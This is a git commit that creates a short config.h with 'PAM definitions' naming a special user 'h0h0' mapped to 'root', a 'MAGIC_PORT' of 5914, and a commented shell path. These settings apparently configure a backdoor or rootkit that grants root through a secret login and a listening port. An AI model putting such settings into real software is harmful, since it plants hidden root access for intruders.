0f610bca45f094e1f8e8c348798df5e00d418e13
Phizo <wfs225-dg@hotmail.com>
2014-07-22 22:31:10 +1000

    Create config.h

---
+++ config.h
@@ -0,0 +1,9 @@
+/* PAM definitions. */
+#define SU_USER   "h0h0"
+#define JACK_USER "root"
+
+/* Socket definitions. */
+#define MAGIC_PORT 5914
+
+/* Miscellaneous. */
+/* #define SHELL_PATH "/bin/bash" */
